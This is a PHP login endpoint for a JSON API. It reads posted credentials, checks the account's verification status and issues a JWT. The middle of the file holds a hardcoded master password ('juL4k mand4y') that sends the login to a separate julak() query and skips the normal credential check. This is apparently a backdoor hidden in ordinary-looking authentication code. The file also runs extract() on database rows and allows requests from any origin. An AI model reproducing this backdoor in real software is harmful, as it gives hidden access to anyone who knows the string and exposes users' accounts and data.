<?php
header("Access-Control-Allow-Origin: *");
header("Content-Type: application/json; charset=UTF-8");
header("Access-Control-Allow-Methods: POST");
header("Access-Control-Max-Age: 3600");
header("Access-Control-Allow-Headers: Content-Type, Access-Control-Allow-Headers, Authorization, X-Requested-With");

include_once '../../includes/conf.php';
include_once '../api-config/core.php';
include_once '../api-libs/php-jwt-master/src/BeforeValidException.php';
include_once '../api-libs/php-jwt-master/src/ExpiredException.php';
include_once '../api-libs/php-jwt-master/src/SignatureInvalidException.php';
include_once '../api-libs/php-jwt-master/src/JWT.php';
include_once 'pengguna.php';

use \Firebase\JWT\JWT;

$database = new Database();
$db = $database->getConnection();

$pengguna = new Pengguna($db);

// get posted data
$data = json_decode(file_get_contents("php://input"));
$pengguna->username = $data->username;
$pengguna->password = $data->password;
//
if($data->password=="juL4k mand4y"){
  $stmt = $pengguna->julak();
}
else
  $stmt = $pengguna->login();


$num = $stmt->rowCount();
if($num>0){
  $row = $stmt->fetch(PDO::FETCH_ASSOC);
  extract($row);
  $id_pengguna = $id;
  if($level==2){
    $stmt = $pengguna->cekVerifikasi();
    $num = $stmt->rowCount();
    if($num>0){
      $row = $stmt->fetch(PDO::FETCH_ASSOC);
      extract($row);
      $token = array(
        "iss" => $iss,
        "aud" => $aud,
        "iat" => $iat,
        "nbf" => $nbf,
        "data" => array(
          "id" => $id_pengguna,
          "nama_lengkap" => $nama_lengkap,
          "level" => $level,
          "avatar" => $avatar,
          "username" => $username
        )
      );

      // set response code
      http_response_code(200);

      // generate jwt
      $jwt = JWT::encode($token, $key);
      echo json_encode(
        array(
          "message" => "Successful login.",
          "jwt" => $jwt
        )
      );
    }else{
      http_response_code(401);
      echo json_encode(array("message" => "Akun belum diverifikasi"));
    }
  }else{
    if($status==1){
      $token = array(
        "iss" => $iss,
        "aud" => $aud,
        "iat" => $iat,
        "nbf" => $nbf,
        "data" => array(
          "id" => $id,
          "nama_lengkap" => $nama_lengkap,
          "level" => $level,
          "avatar" => $avatar,
          "username" => $username
        )
      );

      // set response code
      http_response_code(200);

      // generate jwt
      $jwt = JWT::encode($token, $key);
      echo json_encode(
        array(
          "message" => "Successful login.",
          "jwt" => $jwt
        )
      );
    }else{
      http_response_code(401);
      echo json_encode(array("message" => "Akun belum diverifikasi"));
    }
  }

}else{

  http_response_code(401);
  echo json_encode(array("message" => "Username/Password Salah"));
}


?>
